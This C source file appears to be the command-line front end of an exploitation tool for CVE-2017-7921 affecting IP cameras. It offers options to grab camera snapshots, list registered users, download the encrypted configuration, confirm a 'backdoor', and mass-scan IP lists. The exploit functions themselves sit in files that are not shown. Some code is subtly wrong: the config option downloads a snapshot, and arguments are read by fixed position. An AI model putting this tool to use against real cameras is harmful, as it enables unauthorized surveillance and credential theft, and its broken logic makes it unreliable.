#include "hikreset.h"
//##include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include "scanner.h"


void print_help(char *filename){
	printf("%s - CVE-2017-7921 exploitation tool\n"
		"Common usage:\n"
		"%s <options> <ip>\n"
		"Options:\n"
		"-h/--help - this help message\n"
		"-s/--snapshot <filename> - get snapshot from camera and write it into <filename>\n"
		"-c/--check - just check camera for CVE\n"
		"-g/--getusers - print users registred on camera\n"
		"-C/--getconfig <filename> - get encrypted camera config and write it into <filename>\n"
		"-S/--scan <filename> - scan IPs from <filename> for CVE\n",
		filename, filename
		);
}

void print_usage(char *filename){
	printf("Usage: %s [options] <ip>\n", filename);
	exit(-1);
}

int main(int argc, char **argv)
{
	char opchar = 0;
	struct option long_options[] = {
		{"help",        no_argument,       NULL, 'h'},
		{"snapshot",     required_argument,       NULL, 's'},
		{"check",      no_argument,       NULL, 'c'},
		{"getusers",      no_argument,       NULL, 'g'},
		{"getconfig",      required_argument,       NULL, 'C'},
		{"scan",      required_argument,       NULL, 'S'},
		{NULL, 0, NULL, 0}
	};
	while(-1!=(opchar = getopt_long(argc, argv, "hs:cgC:S:", long_options, NULL))){
		switch(opchar){
			case 'S': {
				FILE *fd;
				fd = fopen(optarg, "rt");
				scan(fd,atoi(argv[3]));
				break;
			}
			case 's': {
				FILE *fd;
				fd = fopen(optarg, "wb");
				download(argv[3], SNAPSHOT, fd);
				break;
			}
			case 'h': {
				print_help(argv[0]);
				break;
			}
			case 'C': {
				FILE *fd;
				fd = fopen(optarg, "wb");
				download(argv[3], SNAPSHOT, fd);
				break;
			}
			case 'c': {
				long status_code = backdoorCheck(argv[2]);
				if (status_code == 200)
					printf("%s - Backdoor Confirmed!\n", argv[2]);
				else{
					printf("%s - Backdoor not confirmed; Status code is %ld\n", argv[2],status_code);
					return status_code;
				}
				break;
			}
			case 'g':{
				getUsers(argv[2]);
				break;
			}
			case 0:{
				print_usage(argv[0]);
				break;
			}
		}

	}

	return 0;
}